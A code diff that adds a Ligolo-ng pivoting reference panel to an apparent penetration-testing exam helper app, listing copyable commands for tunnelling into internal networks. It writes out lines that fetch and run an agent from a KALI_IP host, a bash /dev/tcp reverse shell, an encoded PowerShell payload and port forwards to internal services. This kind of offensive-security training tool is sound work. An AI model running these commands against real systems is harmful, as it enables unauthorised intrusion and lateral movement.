@@ -1783,6 +1783,93 @@ function TransfersPanel() {
   );
 }
 
+// ─── PIVOTING REFERENCE PANEL (LIGOLO-NG) ────────────────
+function PivotingPanel() {
+  const [copied,setCopied] = useState(null);
+  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(cmd).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };
+  const mono = "'JetBrains Mono',monospace";
+
+  const sections = [
+    { title: "1️⃣ LIGOLO PROXY — START ON KALI", scenario: "Run this on your Kali box FIRST. The proxy listens for agent connections from compromised targets.", items: [
+      { id:"pv1", text:"Create tun interface (once per boot)", cmd:"sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up" },
+      { id:"pv2", text:"Start Ligolo proxy — listening for agents on port 11601", cmd:"ligolo-proxy -selfcert -laddr 0.0.0.0:11601" },
+    ]},
+    { title: "2️⃣ UPLOAD & RUN AGENT ON COMPROMISED HOST", scenario: "Transfer the Ligolo agent to your foothold machine (the one you already have a shell on) and connect back to Kali.", items: [
+      { id:"pv3", text:"Linux agent — download and run", cmd:"wget http://KALI_IP/ligolo-agent -O /tmp/ligolo-agent && chmod +x /tmp/ligolo-agent && /tmp/ligolo-agent -connect KALI_IP:11601 -ignore-cert" },
+      { id:"pv4", text:"Windows agent — download and run", cmd:"certutil -urlcache -f http://KALI_IP/ligolo-agent.exe C:\\temp\\ligolo-agent.exe && C:\\temp\\ligolo-agent.exe -connect KALI_IP:11601 -ignore-cert" },
+      { id:"pv5", text:"PowerShell alternative — download + run agent", cmd:"iwr http://KALI_IP/ligolo-agent.exe -OutFile C:\\temp\\ligolo-agent.exe; C:\\temp\\ligolo-agent.exe -connect KALI_IP:11601 -ignore-cert" },
+    ]},
+    { title: "3️⃣ ADD ROUTE TO INTERNAL AD NETWORK", scenario: "Once the agent connects, you'll see it in the proxy. Select it and add a route to reach the internal AD subnet (e.g. 172.16.x.0/24 or 10.10.x.0/24).", items: [
+      { id:"pv6", text:"In Ligolo proxy console — list connected sessions", cmd:"session" },
+      { id:"pv7", text:"Select the agent session (pick the number)", cmd:"1" },
+      { id:"pv8", text:"On KALI — add route to internal subnet through ligolo tun", cmd:"sudo ip route add 10.10.110.0/24 dev ligolo" },
+      { id:"pv9", text:"Start the tunnel in the Ligolo session", cmd:"start" },
+      { id:"pv10", text:"Verify — you should now be able to reach internal hosts", cmd:"nmap -sT -Pn -p 445,3389,5985 10.10.110.100" },
+      { id:"pv10a", text:"NOTE: Adjust subnet to match your target (check ipconfig/ifconfig on foothold for internal interfaces)" },
+    ]},
+    { title: "4️⃣ ACCESS LOCAL SERVICES ON AD MACHINES", scenario: "Some services only listen on 127.0.0.1 on a target machine (e.g. internal web app, database, admin panel). Use Ligolo listener to port-forward them to your Kali.", items: [
+      { id:"pv11", text:"In the active Ligolo session — add a listener (forwards Kali port → target localhost port)", cmd:"listener_add --addr 0.0.0.0:LOCAL_PORT --to 127.0.0.1:REMOTE_PORT" },
+      { id:"pv12", text:"Example: Forward target's internal web app (port 8080) to Kali:8080", cmd:"listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080" },
+      { id:"pv13", text:"Example: Forward target's MySQL (port 3306) to Kali:3306", cmd:"listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306" },
+      { id:"pv14", text:"Example: Forward target's MSSQL (port 1433) to Kali:1433", cmd:"listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433" },
+      { id:"pv15", text:"Access the forwarded service from Kali", cmd:"curl http://127.0.0.1:8080  # or mysql -h 127.0.0.1 -u user -p" },
+      { id:"pv16", text:"List active listeners", cmd:"listener_list" },
+      { id:"pv17", text:"Remove a listener", cmd:"listener_stop LISTENER_ID" },
+    ]},
+    { title: "5️⃣ REVERSE SHELL THROUGH PIVOT", scenario: "Need a shell callback from a machine behind the pivot? Use a Ligolo listener to catch reverse shells through the tunnel.", items: [
+      { id:"pv18", text:"Add listener to catch reverse shells — target sends to pivot host, Ligolo forwards to Kali", cmd:"listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443 --tcp" },
+      { id:"pv19", text:"Start nc listener on Kali to receive the shell", cmd:"rlwrap nc -lvnp 443" },
+      { id:"pv20", text:"On internal target — point reverse shell at the FOOTHOLD machine IP (not Kali)", cmd:"bash -c 'bash -i >& /dev/tcp/FOOTHOLD_INTERNAL_IP/443 0>&1'" },
+      { id:"pv21", text:"Windows variant — point at foothold's internal IP", cmd:"powershell -e JABjAGwAaQ...  # LHOST=FOOTHOLD_INTERNAL_IP LPORT=443" },
+    ]},
+    { title: "6️⃣ DOUBLE PIVOT (SECOND HOP)", scenario: "Need to reach a THIRD network through a second compromised host? Upload agent to the second host and add another route.", items: [
+      { id:"pv22", text:"Upload agent to second-hop machine through existing tunnel", cmd:"# Transfer ligolo-agent to the second pivot host via the tunnel" },
+      { id:"pv23", text:"Run agent on second hop — connects back through the tunnel to Kali proxy", cmd:"./ligolo-agent -connect KALI_IP:11601 -ignore-cert" },
+      { id:"pv24", text:"In Ligolo proxy — switch to new session", cmd:"session" },
+      { id:"pv25", text:"Add route for the deeper subnet", cmd:"sudo ip route add 172.16.200.0/24 dev ligolo" },
+      { id:"pv26", text:"Start the second tunnel", cmd:"start" },
+    ]},
+    { title: "⚡ QUICK REFERENCE", scenario: "Common Ligolo commands at a glance.", items: [
+      { id:"pvq1", text:"session — list/select connected agents", cmd:"session" },
+      { id:"pvq2", text:"ifconfig — show interfaces on the agent (find internal subnets!)", cmd:"ifconfig" },
+      { id:"pvq3", text:"start — activate tunnel on selected session", cmd:"start" },
+      { id:"pvq4", text:"stop — deactivate tunnel", cmd:"stop" },
+      { id:"pvq5", text:"listener_add — port forward through tunnel", cmd:"listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT" },
+      { id:"pvq6", text:"listener_list — show active port forwards", cmd:"listener_list" },
+      { id:"pvq7", text:"Delete route when done (cleanup)", cmd:"sudo ip route del 10.10.110.0/24 dev ligolo" },
+    ]},
+  ];
+
+  return (
+    <div style={{borderBottom:"1px solid rgba(0,255,170,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
+      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(0,255,170,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:2}}>
+        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#00ffaa",letterSpacing:1}}>🔀 LIGOLO-NG PIVOTING REFERENCE</span>
+      </div>
+      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(420px, 1fr))",gap:0}}>
+        {sections.map(sec=>(
+          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
+            <div style={{padding:"6px 10px",background:"rgba(0,255,170,0.03)",borderBottom:"1px solid rgba(0,255,170,0.06)"}}>
+              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#00ffaa"}}>{sec.title}</span>
+            </div>
+            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(0,255,170,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
+              <span style={{fontSize:9.5,fontFamily:mono,color:"#7799aa",lineHeight:1.5}}>{sec.scenario}</span>
+            </div>}
+            {sec.items.map(item=>(
+              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
+                  {item.cmd&&<div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd}</div>}
+                </div>
+                {item.cmd&&<button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(0,255,170,0.15)":"none",border:"none",color:copied===item.id?"#00ffaa":"#445566",cursor:"pointer",padding:"2px 5px",fontSize:11,fontFamily:mono,flexShrink:0}}>{copied===item.id?"✓":"⧉"}</button>}
+              </div>
+            ))}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 // ─── CRACKING REFERENCE PANEL ─────────────────────────────
 function CrackingPanel() {
   const [copied,setCopied] = useState(null);
@@ -2102,6 +2189,7 @@ export default function App() {
   const [showPhishing,setShowPhishing] = useState(false);
   const [showCracking,setShowCracking] = useState(false);
   const [showTransfers,setShowTransfers] = useState(false);
+  const [showPivoting,setShowPivoting] = useState(false);
   const [showPreCheck,setShowPreCheck] = useState(false);
   const [showReset,setShowReset] = useState(false);
   const [examStart,setExamStart] = useState(saved.examStart||null);
@@ -2195,6 +2283,7 @@ export default function App() {
           <button onClick={()=>setShowPhishing(!showPhishing)} style={{background:showPhishing?"rgba(255,100,100,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPhishing?"rgba(255,100,100,0.25)":"rgba(100,130,160,0.1)"}`,color:showPhishing?"#ff6666":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🎣 PHISHING</button>
           <button onClick={()=>setShowCracking(!showCracking)} style={{background:showCracking?"rgba(255,170,0,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showCracking?"rgba(255,170,0,0.25)":"rgba(100,130,160,0.1)"}`,color:showCracking?"#ffaa00":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔓 CRACKING</button>
           <button onClick={()=>setShowTransfers(!showTransfers)} style={{background:showTransfers?"rgba(68,170,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showTransfers?"rgba(68,170,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showTransfers?"#44aaff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>📦 TRANSFERS</button>
+          <button onClick={()=>setShowPivoting(!showPivoting)} style={{background:showPivoting?"rgba(0,255,170,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPivoting?"rgba(0,255,170,0.25)":"rgba(100,130,160,0.1)"}`,color:showPivoting?"#00ffaa":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔀 PIVOTING</button>
           <button onClick={()=>setShowPreCheck(!showPreCheck)} style={{background:showPreCheck?"rgba(170,130,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPreCheck?"rgba(170,130,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showPreCheck?"#aa88ff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🛡️ PRE-CHECK</button>
           <button onClick={()=>{const s=getStarred();const t=s.map(x=>`[${x.machine}] ${x.item}${x.note?" — "+x.note:""}`).join("\n");navigator.clipboard.writeText(t).catch(()=>{})}} style={{background:"rgba(255,170,0,0.06)",border:"1px solid rgba(255,170,0,0.15)",color:"#887733",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}} title="Copy starred items for report">★ EXPORT</button>
         </div>
@@ -2212,6 +2301,7 @@ export default function App() {
       {showPhishing&&<PhishingPanel/>}
       {showCracking&&<CrackingPanel/>}
       {showTransfers&&<TransfersPanel/>}
+      {showPivoting&&<PivotingPanel/>}
       {showPreCheck&&<PreEngagementPanel/>}
 
       {/* Tabs */}
